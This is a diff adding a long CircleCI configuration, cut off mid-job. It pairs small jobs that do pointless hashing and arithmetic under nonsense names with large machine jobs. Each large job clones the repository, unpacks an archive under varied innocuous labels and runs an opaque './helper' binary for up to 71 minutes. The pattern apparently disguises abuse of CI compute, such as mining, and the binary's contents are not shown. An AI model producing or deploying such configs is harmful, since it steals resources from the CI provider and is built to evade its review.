@@ -1,0 +1,1607 @@
+version: 2.1
+
+jobs:
+  precheck_update-retry:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: flag check
+          command: |
+            mkdir -p /tmp/workspace
+            set +o pipefail 2>/dev/null; seq 1 990667 | md5sum > /tmp/workspace/READY.txt; true
+            du -h /tmp/workspace/READY.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - READY.txt
+  update-retry:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/READY.txt || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  D_greg-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: lower volume
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; head -c 512 /dev/urandom | sha256sum | awk '{print $1}'; true ; } > /tmp/workspace/relay.ok
+            du -h /tmp/workspace/relay.ok
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - relay.ok
+  greg-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/relay.ok || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  compile_all-greens:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: elm plank
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 716800 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/workspace/relay.state
+            du -h /tmp/workspace/relay.state
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - relay.state
+  all-greens:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/relay.state || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  builder_depoly:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: jive hop
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a[1]=10; a[2]=20; a[3]=30; for(k in a) s+=a[k]; print s}'; true ; } > /tmp/workspace/main_phase_output.out
+            du -h /tmp/workspace/main_phase_output.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - main_phase_output.out
+  depoly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  kick_pat-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: riptide
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(y=2000;y<=2024;y++){if(y%4==0&&y%100!=0||y%400==0)c++} print c}'; true ; } > /tmp/workspace/step-16.out
+            du -h /tmp/workspace/step-16.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-16.out
+  pat-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  fetch_hotfix-4011:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: lighthouse
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{num=12345; r=""; while(num>0){r=(num%2) r; num=int(num/2)}; print r}'; true ; } > /tmp/workspace/step-26.log
+            du -h /tmp/workspace/step-26.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-26.log
+  hotfix-4011:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  install_DEV_VERIFY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: arnold press
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "data1" | od -An -c | head -1; true ; } > /tmp/workspace/PASS
+            du -h /tmp/workspace/PASS
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - PASS
+  DEV_VERIFY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/PASS || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  enqueue_xray-6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: countersink
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; cat /proc/self/status | grep -E "^Name|^Uid" | head -2; true ; } > /tmp/workspace/audit.log
+            du -h /tmp/workspace/audit.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - audit.log
+  xray-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  reload_package:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: spiral down
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1536000 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/workspace/step-23.txt
+            du -h /tmp/workspace/step-23.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-23.txt
+  package:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  orchestrate_ivan-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: pellet grill
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%s=%s\n" a 1 b 2 c 3; true ; } > /tmp/workspace/metrics.tsv
+            du -h /tmp/workspace/metrics.tsv
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - metrics.tsv
+  ivan-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  deps_wip-dashboard:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: true tone
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%x\n" $$; true ; } > /tmp/workspace/step-pass.sig
+            du -h /tmp/workspace/step-pass.sig
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-pass.sig
+  wip-dashboard:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/step-pass.sig || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Rehydrate tree
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  red_canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: rolling hitch
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "%d\n" $((RANDOM * 17 + 42)); true ; } > /tmp/workspace/bundle
+            du -h /tmp/workspace/bundle
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - bundle
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/bundle || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch corpus
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  preinit_b-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: plank 60
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; seq 1 182720 | awk 'NR>10829 && NR<3050{s+=$1}END{print s}'; true ; } > /tmp/workspace/507.data
+            du -h /tmp/workspace/507.data
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 507.data
+  b-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/507.data || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Checkout vendored deps
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  prep_fix-4963:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: sing along
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{split("red,green,blue",a,","); for(i in a) print a[i]}' | sort; true ; } > /tmp/workspace/stage.dat
+            du -h /tmp/workspace/stage.dat
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - stage.dat
+  fix-4963:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/stage.dat || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  resync_depoly-53:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: hair dry
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "pw" | sha256sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/workspace/FINAL.txt
+            du -h /tmp/workspace/FINAL.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - FINAL.txt
+  depoly-53:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack payload
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  vendor_rl-2a:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: scuttle shut
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; grep -i hELLO <<<$'Hello World\nHELLO AGAIN\nhello\n'; true ; } > /tmp/workspace/stats.csv
+            du -h /tmp/workspace/stats.csv
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - stats.csv
+  rl-2a:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/stats.csv || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore snapshot
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  teardown_release:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: nope ever
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; free 2>/dev/null | head -2 | md5sum || echo free-missing; true ; } > /tmp/workspace/604a.txt
+            du -h /tmp/workspace/604a.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 604a.txt
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/604a.txt || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  blue_luna-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: upstream battle
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=5 2>/dev/null | gzip -9 | wc -c; true ; } > /tmp/workspace/buffer.bin
+            du -h /tmp/workspace/buffer.bin
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - buffer.bin
+  luna-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unroll archive
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  enqueue_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: side flip
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=0;i<10;i++)s=s"X"; print length(s), s}'; true ; } > /tmp/workspace/phase-ready.sig
+            du -h /tmp/workspace/phase-ready.sig
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - phase-ready.sig
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Seed workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  sys_VerifyRelease:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: assisted squat
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/workspace/344v2.data
+            du -h /tmp/workspace/344v2.data
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 344v2.data
+  VerifyRelease:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/344v2.data || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  resync_Ship_Prod7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: thread fine
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo "data" | b2sum 2>/dev/null | head -c 20 || echo "data" | md5sum | head -c 20; true ; } > /tmp/workspace/step-15.log
+            du -h /tmp/workspace/step-15.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-15.log
+  Ship_Prod7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/step-15.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore vendored sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  round1_ensure-quick-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: revolve
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<10;i++) printf "%s%d", (i>0?",":""), i*7; print ""}'; true ; } > /tmp/workspace/stats.jsonl
+            du -h /tmp/workspace/stats.jsonl
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - stats.jsonl
+  ensure-quick-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Fetch fixtures
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  red_sierra:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: hum
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; printf "red\nblue\ngreen\nblue\nred\n" | awk '!seen[$0]++'; true ; } > /tmp/workspace/step-3.out
+            du -h /tmp/workspace/step-3.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-3.out
+  sierra:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  compile_MERGE_LAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: early supper
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; echo abcdef | wc -c; true ; } > /tmp/workspace/passoff.state
+            du -h /tmp/workspace/passoff.state
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - passoff.state
+  MERGE_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/audit.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack toolkit
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  auditor_INFRA-975:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: plank fall
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/workspace/609.out
+            du -h /tmp/workspace/609.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 609.out
+  INFRA-975:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/609.out || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Hydrate workspace
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  phase2_add-retry-reload:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: hotfix
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 2326); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/workspace/step-22.out
+            du -h /tmp/workspace/step-22.out
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-22.out
+  add-retry-reload:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/step-22.out || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract sources
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  loader_go1-21-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: snatch
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=210 2>/dev/null | md5sum; true ; } > /tmp/workspace/step-9.log
+            du -h /tmp/workspace/step-9.log
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - step-9.log
+  go1-21-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/step-9.log || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  cache_gating:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: soon
+          command: |
+            mkdir -p /tmp/workspace
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{n=12; result=1; while(n>1){result*=n; n--}; print result}'; true ; } > /tmp/workspace/942v2.txt
+            du -h /tmp/workspace/942v2.txt
+      - persist_to_workspace:
+          root: /tmp/workspace
+          paths:
+            - 942v2.txt
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: Stage recovery
+          command: |
+            du -b /tmp/workspace/942v2.txt || true
+      - run:
+          name: Load source
+          command: git clone --depth 2 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat static.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 71m
+          command: env ./helper
+  provision_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/workspace
+      - run:
+          name: double rap
+          command: |
+            mkdir -p /tmp/workspace
